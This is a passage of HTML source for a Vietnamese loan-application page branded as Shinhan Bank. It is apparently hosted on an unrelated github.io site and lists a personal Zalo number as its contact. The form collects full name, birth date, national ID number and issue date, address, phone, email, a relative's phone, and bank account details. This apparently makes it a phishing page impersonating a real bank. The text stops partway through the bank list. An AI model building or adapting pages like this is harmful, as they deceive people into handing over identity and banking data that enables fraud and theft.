<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ngân hàng Shinhan - Nhập thông tin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            margin: 0;
            background: #f8f9fa;
        }
        .header {
            padding: 15px;
            background: #fff;
            border-bottom: 1px solid #b3cde0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header img {
            height: 35px;
        }
        .header-icons {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-icons i {
            font-size: 24px;
            cursor: pointer;
            color: #0052cc;
        }
        .container {
            max-width: 90%;
            width: 100%;
            margin: 15px 5%;
            padding: 15px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
        }
        @media (min-width: 768px) {
            .container {
                max-width: 700px;
                margin: 15px auto;
            }
        }
        .nav-tabs {
            display: flex;
            justify-content: space-around;
            margin-bottom: 15px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .nav-tabs .nav-item {
            flex: 1;
            text-align: center;
        }
        .nav-tabs .nav-link {
            background: #d3d3d3;
            color: #fff;
            border-radius: 20px;
            padding: 8px 10px;
            font-weight: 500;
            font-size: 12px;
            width: 100%;
            margin: 0 2px;
            white-space: nowrap;
        }
        .nav-tabs .nav-link.active {
            background: #0033a0;
            color: #fff;
        }
        @media (max-width: 767px) {
            .nav-tabs .nav-link {
                font-size: 10px;
                padding: 6px 8px;
            }
            .form-row {
                flex-direction: column;
                gap: 10px;
            }
            .form-group {
                width: 100%;
                padding: 0;
            }
            .custom-select-toggle, .custom-select-list {
                width: 100%;
            }
            .container {
                padding: 10px;
                margin: 10px 2.5%;
            }
            .header {
                padding: 10px;
            }
            .header img {
                height: 30px;
            }
            .header-icons i {
                font-size: 20px;
            }
        }
        .section-title {
            color: #0033a0;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
            text-transform: uppercase;
            text-align: center;
        }
        .form-label {
            font-weight: 400;
            color: #1a3c87;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-label-span {
            color: #ff4d4f;
        }
        .form-control, .form-select {
            border-radius: 20px;
            border: 1px solid #b3cde0;
            padding: 8px 12px;
            font-size: 14px;
            height: 40px;
            font-family: 'Roboto', sans-serif;
            transition: border-color 0.3s ease;
        }
        .form-control:focus, .form-select:focus {
            border-color: #0033a0;
            box-shadow: 0 0 5px rgba(0, 51, 160, 0.3);
            outline: none;
        }
        .form-control.valid, .form-select.valid {
            border-color: #0033a0 !important;
        }
        .form-control.super-short {
            width: 60px;
        }
        .form-control.extra-short, .form-select.extra-short {
            width: 120px;
            min-width: 100px;
        }
        .form-control.short, .form-select.short {
            width: 250px;
            min-width: 120px;
        }
        .form-control.medium {
            width: 350px;
        }
        .form-control.long {
            width: 500px;
        }
        @media (max-width: 767px) {
            .form-control.super-short, .form-control.extra-short, .form-control.short,
            .form-control.medium, .form-control.long, .form-select {
                width: 100% !important;
                min-width: unset;
            }
        }
        .form-control:disabled, .form-control[readonly] {
            background: #e0e7ff;
        }
        .form-select {
            appearance: none;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .707.708l-6 6a.5.5 0 0 1-.707 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 12px;
            height: 40px;
        }
        .form-note {
            color: #0052cc;
            font-size: 12px;
            margin-top: 5px;
        }
        .btn-primary {
            background: #0033a0;
            border: none;
            border-radius: 20px;
            padding: 8px 16px;
            font-weight: 700;
            font-size: 14px;
            font-family: 'Roboto', sans-serif;
            transition: background 0.3s ease;
        }
        .btn-primary:hover {
            background: #0052cc;
        }
        .footer {
            background: #0033a0;
            color: #fff;
            text-align: center;
            padding: 15px;
            font-size: 12px;
        }
        .footer-links a {
            color: #b3cde0;
            margin: 0 8px;
            text-decoration: none;
        }
        .footer-links a:hover {
            color: #fff;
        }
        .invalid-feedback {
            display: none;
            font-size: 12px;
            color: #ff4d4f;
            margin-top: 5px;
        }
        .was-validated .form-control:invalid, .was-validated .form-select:invalid,
        .form-control.is-invalid, .form-select.is-invalid, .custom-select.is-invalid .custom-select-toggle {
            border-color: #ff4d4f;
        }
        .was-validated .form-control:invalid ~ .invalid-feedback,
        .was-validated .form-select:invalid ~ .invalid-feedback,
        .form-control.is-invalid ~ .invalid-feedback,
        .form-select.is-invalid ~ .invalid-feedback,
        .custom-select.is-invalid ~ .invalid-feedback {
            display: block;
        }
        .form-group {
            position: relative;
            margin-bottom: 15px;
            padding: 5px;
        }
        .form-group-bordered {
            border-bottom: 1px solid #d3d3d3;
        }
        .section-divider {
            border-top: 1px solid #d3d3d3;
            margin: 20px 0;
        }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        @media (max-width: 767px) {
            .button-group {
                flex-direction: column;
                justify-content: center;
            }
            .button-group button {
                flex-grow: 1;
                text-align: center;
            }
        }
        .dropdown-menu {
            min-width: 200px;
        }
        .dropdown-menu a {
            color: #0033a0;
            text-transform: uppercase;
            font-size: 14px;
            padding: 8px 12px;
        }
        .dropdown-menu a:hover {
            background: #e6f0fa;
            color: #0052cc;
        }
        .form-row {
            display: flex;
            gap: 15px;
            align-items: flex-start;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        .form-row .form-group {
            flex: 1;
            border-bottom: 1px solid #d3d3d3;
            padding: 5px;
            min-width: 150px;
        }
        .form-select:invalid {
            color: #6c757d;
            font-style: italic;
        }
        .form-select option {
            color: #000;
            font-style: normal;
        }
        .tooltip-icon {
            color: #0033a0;
            margin-left: 5px;
            cursor: pointer;
        }
        .custom-select {
            position: relative;
            width: 100%;
        }
        .custom-select-toggle {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #b3cde0;
            border-radius: 20px;
            background: #fff;
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 14px;
            height: 40px;
            font-family: 'Roboto', sans-serif;
            transition: border-color 0.3s ease;
        }
        .custom-select-toggle:focus {
            border-color: #0033a0;
            box-shadow: 0 0 5px rgba(0, 51, 160, 0.3);
            outline: none;
        }
        .custom-select-toggle img {
            width: 28px;
            height: 28px;
            margin-right: 8px;
            object-fit: contain;
            vertical-align: middle;
        }
        .custom-select-list {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            background: #fff;
            border: 1px solid #b3cde0;
            border-radius: 10px;
            max-height: 50vh;
            overflow-y: auto;
            z-index: 1001;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .custom-select-list.show {
            display: block;
        }
        .custom-select-option {
            padding: 8px 12px;
            display: flex;
            align-items: center;
            cursor: pointer;
            max-width: 100%;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .custom-select-option:hover,
        .custom-select-option:focus {
            background: #e6f0fa;
        }
        .custom-select-option img {
            width: 28px;
            height: 28px;
            margin-right: 8px;
            object-fit: contain;
            vertical-align: middle;
        }
        .calculation-table {
            margin-top: 15px;
            font-size: 14px;
            width: 100%;
            border-collapse: collapse;
        }
        .calculation-table th, .calculation-table td {
            padding: 6px;
            text-align: center;
            border: 1px solid #d3d3d3;
        }
        .calculation-table th {
            background: #e6f0fa;
            font-weight: 500;
        }
        @media (max-width: 767px) {
            .calculation-table {
                display: block;
                font-size: 12px;
            }
            .calculation-table thead {
                display: none;
            }
            .calculation-table tbody tr {
                display: flex;
                flex-wrap: wrap;
                padding: 8px 0;
                border-bottom: 1px solid #d3d3d3;
            }
            .calculation-table tbody td {
                flex: 1 1 100%;
                padding: 4px;
                text-align: left;
                display: flex;
                justify-content: space-between;
                font-size: 11px;
            }
            .calculation-table tbody td:before {
                content: attr(data-label);
                font-weight: 500;
                color: #1a3c87;
                display: block;
                flex: 0 0 35%;
            }
            .calculation-table tbody td:nth-child(1):before { content: "Tháng: "; }
            .calculation-table tbody td:nth-child(2):before { content: "Gốc: "; }
            .calculation-table tbody td:nth-child(3):before { content: "Lãi: "; }
            .calculation-table tbody td:nth-child(4):before { content: "Tổng: "; }
            .calculation-table tbody td:nth-child(5):before { content: "Dư nợ: "; }
        }
        .success-message {
            color: #28a745;
            font-size: 12px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }
        .form-check {
            margin-top: 20px;
            text-align: center;
        }
        .form-check-label a {
            color: #0052cc;
            text-decoration: underline;
        }
        .spinner {
            display: none;
            margin-left: 8px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" onerror="this.src='https://via.placeholder.com/150x50?text=Logo Ngân hàng Shinhan'" alt="Logo Ngân hàng Shinhan">
        <div class="header-icons">
            <i class="bi bi-search" aria-label="Tìm kiếm"></i>
            <div class="dropdown">
                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Menu"></i>
                <ul class="dropdown-menu dropdown-menu-end">
                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                    <li><a class="dropdown-item" href="https://zalo.me/84762797077">LIÊN HỆ</a></li>
                </ul>
            </div>
        </div>
    </div>

    <div class="container">
        <ul class="nav-tabs">
            <li class="nav-item">
                <a class="nav-link active" href="#">1. Nhập thông tin</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">3. Hoàn thành</a>
            </li>
        </ul>

        <form id="registrationForm" onsubmit="handleSubmit(event)">
            <input type="hidden" id="csrf" name="_csrf" value="mock-csrf-token">

            <div class="mb-2">
                <label class="section-title">THÔNG TIN CÁ NHÂN</label>
                <div class="form-group">
                    <label class="form-label">Họ và Tên <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Vui lòng ghi rõ họ và tên như trên CCCD"></i></label>
                    <input type="text" class="form-control long" id="fullName" name="fullName" autocomplete="name" required>
                    <div class="invalid-feedback" id="fullNameError"></div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Ngày sinh <span class="form-label-span">*</span></label>
                        <input type="text" class="form-control extra-short" id="dob" name="dob" autocomplete="bday" placeholder="dd/mm/yyyy" required>
                        <div class="invalid-feedback" id="dobError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Giới tính <span class="form-label-span">*</span></label>
                        <select class="form-select extra-short" id="gender" name="gender" autocomplete="sex" required>
                            <option value="">Chọn giới tính</option>
                            <option value="Nam">Nam</option>
                            <option value="Nữ">Nữ</option>
                            <option value="Khác">Khác</option>
                        </select>
                        <div class="invalid-feedback" id="genderError"></div>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Địa chỉ thường trú <span class="form-label-span">*</span></label>
                    <input type="text" class="form-control long" id="contactAddress" name="contactAddress" autocomplete="street-address" required>
                    <div class="invalid-feedback" id="contactAddressError"></div>
                </div>

                <div class="form-group">
                    <label class="form-label">Quê quán <span class="form-label-span">*</span></label>
                    <input type="text" class="form-control long" id="hometown" name="hometown" required>
                    <div class="invalid-feedback" id="hometownError"></div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Quốc tịch <span class="form-label-span">*</span></label>
                        <input type="text" class="form-control extra-short" id="nationality" name="nationality" value="Việt Nam" required>
                        <div class="invalid-feedback" id="nationalityError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Ngày cấp <span class="form-label-span">*</span></label>
                        <input type="text" class="form-control extra-short" id="idIssueDate" name="idIssueDate" placeholder="dd/mm/yyyy" required>
                        <div class="invalid-feedback" id="idIssueDateError"></div>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span class="form-label-span">*</span></label>
                    <input type="text" class="form-control short" id="cccd" name="cccd" autocomplete="off" required maxlength="12">
                    <div class="invalid-feedback" id="cccdError"></div>
                </div>

                <div class="form-group form-group-bordered">
                    <label class="form-label">Nơi cấp <span class="form-label-span">*</span></label>
                    <select class="form-select long" id="issuePlace" name="issuePlace" required>
                        <option value="">Chọn nơi cấp</option>
                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                    </select>
                    <div class="invalid-feedback" id="issuePlaceError"></div>
                </div>
            </div>

            <hr class="section-divider">

            <div class="mb-2">
                <label class="section-title">THÔNG TIN ĐĂNG KÝ</label>
                <div class="form-group">
                    <label class="form-label">Số điện thoại <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                    <input type="tel" class="form-control short" id="phone" name="phone" autocomplete="tel" required maxlength="13">
                    <div class="invalid-feedback" id="phoneError"></div>
                </div>

                <div class="form-group">
                    <label class="form-label">Email <span class="form-label-span">*</span></label>
                    <input type="email" class="form-control medium" id="email" name="email" autocomplete="email" required>
                    <div class="form-note">Bạn sẽ nhận được hồ sơ đăng ký về email này.</div>
                    <div class="invalid-feedback" id="emailError"></div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Hình thức vay <span class="form-label-span">*</span></label>
                        <select class="form-select short" id="loanType" name="loanType" required>
                            <option value="">Chọn Hình thức vay</option>
                            <option value="Vay tín chấp">Vay tín chấp</option>
                            <option value="Vay thế chấp">Vay thế chấp</option>
                            <option value="Vay mua nhà">Vay mua nhà</option>
                            <option value="Vay mua xe">Vay mua xe</option>
                            <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                            <option value="Vay trả góp">Vay trả góp</option>
                        </select>
                        <div class="invalid-feedback" id="loanTypeError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Thời hạn vay yêu cầu <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Chọn số tháng vay phù hợp"></i></label>
                        <select class="form-select extra-short" id="loanTerm" name="loanTerm" required>
                            <option value="">Chọn số tháng</option>
                            <option value="6">6 tháng</option>
                            <option value="12">12 tháng</option>
                            <option value="18">18 tháng</option>
                            <option value="24">24 tháng</option>
                            <option value="36">36 tháng</option>
                            <option value="48">48 tháng</option>
                            <option value="60">60 tháng</option>
                        </select>
                        <div class="invalid-feedback" id="loanTermError"></div>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Số tiền vay yêu cầu (đồng) <span class="form-label-span">*</span></label>
                        <select class="form-select short" id="loanAmount" name="loanAmount" required>
                            <option value="">Chọn số tiền</option>
                            <option value="10000000">10.000.000</option>
                            <option value="20000000">20.000.000</option>
                            <option value="30000000">30.000.000</option>
                            <option value="40000000">40.000.000</option>
                            <option value="50000000">50.000.000</option>
                            <option value="60000000">60.000.000</option>
                            <option value="70000000">70.000.000</option>
                            <option value="80000000">80.000.000</option>
                            <option value="90000000">90.000.000</option>
                            <option value="100000000">100.000.000</option>
                            <option value="150000000">150.000.000</option>
                            <option value="200000000">200.000.000</option>
                            <option value="300000000">300.000.000</option>
                            <option value="400000000">400.000.000</option>
                            <option value="500000000">500.000.000</option>
                            <option value="other">Khác</option>
                        </select>
                        <div class="invalid-feedback" id="loanAmountError"></div>
                    </div>
                    <div class="form-group" id="customLoanAmountGroup" style="display: none;">
                        <label class="form-label">Số tiền vay tùy chỉnh (đồng) <span class="form-label-span">*</span></label>
                        <input type="text" class="form-control short" id="customLoanAmount" name="customLoanAmount" maxlength="18">
                        <div class="invalid-feedback" id="customLoanAmountError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Dự kiến giải ngân <span class="form-label-span">*</span></label>
                        <input type="date" class="form-control extra-short" id="disbursementDate" name="disbursementDate" autocomplete="off" required>
                        <div class="invalid-feedback" id="disbursementDateError"></div>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Lãi suất (%/năm) <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Lãi suất được tự động chọn theo gói vay"></i></label>
                        <input type="number" class="form-control extra-short" id="interestRate" name="interestRate" step="0.01" required readonly>
                        <div class="invalid-feedback" id="interestRateError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Thu nhập hàng tháng (đồng) <span class="form-label-span">*</span></label>
                        <input type="text" class="form-control extra-short" id="monthlyIncome" name="monthlyIncome" required>
                        <div class="invalid-feedback" id="monthlyIncomeError"></div>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Nghề nghiệp <span class="form-label-span">*</span></label>
                        <select class="form-select short" id="occupation" name="occupation" required>
                            <option value="">Chọn nghề nghiệp</option>
                            <option value="Kỹ sư">Kỹ sư</option>
                            <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
                            <option value="Giáo viên">Giáo viên</option>
                            <option value="Bác sĩ">Bác sĩ</option>
                            <option value="Kinh doanh">Kinh doanh</option>
                            <option value="Nội dung hỗ trợ">Nội dung hỗ trợ</option>
                            <option value="Hưu trí">Hưu trí</option>
                            <option value="Khác">Khác</option>
                        </select>
                        <div class="invalid-feedback" id="occupationError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Mục đích vay <span class="form-label-span">*</span></label>
                        <select class="form-select short" id="loanPurpose" name="loanPurpose" required>
                            <option value="">Chọn mục đích vay</option>
                            <option value="Mua nhà">Mua nhà</option>
                            <option value="Mua xe">Mua xe</option>
                            <option value="Kinh doanh">Kinh doanh</option>
                            <option value="Học tập">Học tập</option>
                            <option value="Du lịch">Du lịch</option>
                            <option value="Tiêu dùng">Tiêu dùng</option>
                            <option value="Khác">Khác</option>
                        </select>
                        <div class="invalid-feedback" id="loanPurposeError"></div>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Số điện thoại thân nhân <span class="form-label-span">*</span> <i class="fas fa-info-circle tooltip-icon" data-bs-toggle="tooltip" title="Nhập số điện thoại bắt đầu bằng +84 hoặc 0 (10 chữ số)"></i></label>
                        <input type="tel" class="form-control short" id="relativePhone" name="relativePhone" autocomplete="tel" required maxlength="13">
                        <div class="invalid-feedback" id="relativePhoneError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Quan hệ <span class="form-label-span">*</span></label>
                        <select class="form-select short" id="relationship" name="relationship" required>
                            <option value="">Chọn quan hệ</option>
                            <option value="Bạn bè">Bạn</option>
                            <option value="Anh">Anh</option>
                            <option value="Chị">Chị</option>
                            <option value="Em">Em</option>
                            <option value="Đồng nghiệp">Đồng nghiệp</option>
                            <option value="Vợ/Chồng">Vợ/Chồng</option>
                            <option value="Bố">Bố</option>
                            <option value="Mẹ">Mẹ</option>
                            <option value="Khác">Khác</option>
                        </select>
                        <div class="invalid-feedback" id="relationshipError"></div>
                    </div>
                </div>
            </div>

            <hr class="section-divider">

            <div class="mb-2">
                <label class="section-title">TÀI KHOẢN GIẢI NGÂN</label>
                <div class="form-group">
                    <label class="form-label">Tên tài khoản chủ <span class="form-label-span">*</span></label>
                    <input type="text" class="form-control long" id="accountName" name="accountName" autocomplete="name" required>
                    <div class="invalid-feedback" id="accountNameError"></div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số tài khoản <span class="form-label-span">*</span></label>
                    <input type="text" class="form-control short" id="accountNumber" name="accountNumber" autocomplete="off" required maxlength="20">
                    <div class="invalid-feedback" id="accountNumberError"></div>
                </div>

                <div class="form-group form-group-bordered">
                    <label class="form-label">Tên ngân hàng <span class="form-label-span">*</span></label>
                    <div class="custom-select" id="bank-select">
                        <div class="custom-select-toggle" tabindex="0" aria-expanded="false">
                           <span>-- Chọn ngân hàng --</span>
                        </div>
                        <div class="custom-select-list">
                            <div class="custom-select-option" data-value="shinhan">
                                <img src="https://storage.googleapis.com/housezy-2f8ee.appspot.com/images/entities/500/1694489220481.jpg" alt="Shinhan Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Shinhan Việt Nam (Shinhanbank)
                            </div>
                            <div class="custom-select-option" data-value="vietcombank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSKfmg8stlijHEtnHcr6mzKL6-ZOakaHlxQ6Cl8uLaIJ7YaCA624VeA-Nxa8hJORjiN0Z4" alt="Vietcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Ngoại Thương Việt Nam (Vietcombank)
                            </div>
                            <div class="custom-select-option" data-value="vietinbank">
                                <img src="https://i.pinimg.com/564x/0e/33/49/0e3349ab85ae5ebf604df3cb380f9c8f.jpg" alt="VietinBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Công Thương Việt Nam (VietinBank)
                            </div>
                            <div class="custom-select-option" data-value="bidv">
                                <img src="https://play-lh.googleusercontent.com/g9KCglN_UhMUgccQxVg112tz3AAa0-ZqrgOkoKLtPe34-a6ZiOdzyW26hSWcqa-1sQ" alt="BIDV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Đầu tư và Phát triển Việt Nam (BIDV)
                            </div>
                            <div class="custom-select-option" data-value="techcombank">
                                <img src="https://techcombank.com/content/dam/techcombank/public-site/seo/techcombank_logo_svg_86201e50d1.svg" alt="Techcombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Kỹ Thương Việt Nam (Techcombank)
                            </div>
                            <div class="custom-select-option" data-value="agribank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSu3s9LbPJqkaqT616sITYzyBYPaLHI2FzwDg&s" alt="Agribank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam (Agribank)
                            </div>
                            <div class="custom-select-option" data-value="mbbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSXmD_3PBoPHofJkAQ49sZr82DFZLHmYN9cfHLwoVxtLhNHWnvXNCDGJitDaTEeZSImOSs" alt="MB Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Quân đội (MB Bank)
                            </div>
                            <div class="custom-select-option" data-value="vpbank">
                                <img src="https://yt3.googleusercontent.com/_uwwTxJP2A_IA_MwU5fkDIcsLOXW1SmqNKfAxJZmVudOwp29NuPlm69So0P7I0B3s78X-5syQQ=s900-c-k-c0x00ffffff-no-rj" alt="VPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)
                            </div>
                            <div class="custom-select-option" data-value="vib">
                                <img src="https://inkythuatso.com/uploads/thumbnails/800/2021/12/logo-vib-inkythuatso-3-21-13-44-34.jpg" alt="VIB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Quốc tế Việt Nam (VIB)
                            </div>
                            <div class="custom-select-option" data-value="hdbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRhn0wDaZ9SXY0_LxW746TbKXgeFpJKkwxejd6jSi_6lHSrHSMogb1zYSIcynwmQK7dOeE" alt="HDBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Phát triển TP.HCM (HDBank)
                            </div>
                            <div class="custom-select-option" data-value="ocb">
                                <img src="https://whypay.vn/assets/images/nganhang/ocb.png" alt="OCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Phương Đông (OCB)
                            </div>
                            <div class="custom-select-option" data-value="acb">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQW7j478Y5CAP5aulWNTxu8M46IjdgH5tVfww&s" alt="ACB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Á Châu (ACB)
                            </div>
                            <div class="custom-select-option" data-value="sacombank">
                                <img src="https://play-lh.googleusercontent.com/UmnQk5GidbwIKmAKFFmrEPYjekyfB2gD_V1t2e-CDWGu_YlYDqpgs1moIsiouqEF=w240-h480-rw" alt="Sacombank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Sài Gòn Thương Tín (Sacombank)
                            </div>
                            <div class="custom-select-option" data-value="tpbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTL9Cpp1nDLbzIrK_-ljQsqJOGbytIiiDAgmQ&s" alt="TPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Tiên Phong (TPBank)
                            </div>
                            <div class="custom-select-option" data-value="scb">
                                <img src="https://play-lh.googleusercontent.com/z7gOit-6cq79jN3hcU-lquDoswKkIKjMYRWCpYKQ9yefkCCJBxn7DBIz0GFOmEg2mug=w600-h300-pc0xffffff-pd" alt="SCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Sài Gòn (SCB)
                            </div>
                            <div class="custom-select-option" data-value="msb">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSUpmXz0eeUTJ_9uJFEp2fEy4tIWgNVN595yg&s" alt="MSB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Hàng Hải Việt Nam (MSB)
                            </div>
                            <div class="custom-select-option" data-value="eximbank">
                                <img src="https://whypay.vn/assets/images/nganhang/eximbank.png" alt="Eximbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Xuất Nhập khẩu Việt Nam (Eximbank)
                            </div>
                            <div class="custom-select-option" data-value="seabank">
                                <img src="https://whypay.vn/assets/images/nganhang/seabank.png" alt="SeABank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Đông Nam Á (SeABank)
                            </div>
                            <div class="custom-select-option" data-value="lienvietsong">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRMx4VEYNLmFxS-zRDU1RSGf1WLjjAooLdviw&s" alt="LienVietPostBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Bưu điện Liên Việt (LienVietPostBank)
                            </div>
                            <div class="custom-select-option" data-value="pvcombank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRejSFXwXKB4Jo5sxREyISfcwSYHCOJrbOqAA&s" alt="PVcomBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Đại chúng Việt Nam (PVcomBank)
                            </div>
                            <div class="custom-select-option" data-value="namabank">
                                <img src="https://nhatrang-travel.com/upload/2001105/20200821/logo2_4efce.png" alt="Nam A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Nam Á (Nam A Bank)
                            </div>
                            <div class="custom-select-option" data-value="shb">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRZAzuTTNf1p5s-eBhQ7k4xkgQEJqZ2SGVGXQ&s" alt="SHB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Sài Gòn - Hà Nội (SHB)
                            </div>
                            <div class="custom-select-option" data-value="kienlongbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSae4OzfCjQ84U5XlcVdEdIO4gEJUzsKtLgFg&s" alt="Kienlongbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Kiên Long (Kienlongbank)
                            </div>
                            <div class="custom-select-option" data-value="baovietbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ1nFeuHEoRTFwHRc0_dvDuJ6wBRJgXd8c79A&s" alt="BaoViet Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Bảo Việt (BaoViet Bank)
                            </div>
                            <div class="custom-select-option" data-value="pgbank">
                                <img src="https://whypay.vn/assets/images/nganhang/pgbank.png" alt="PGBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Xăng dầu Petrolimex (PGBank)
                            </div>
                            <div class="custom-select-option" data-value="vietbank">
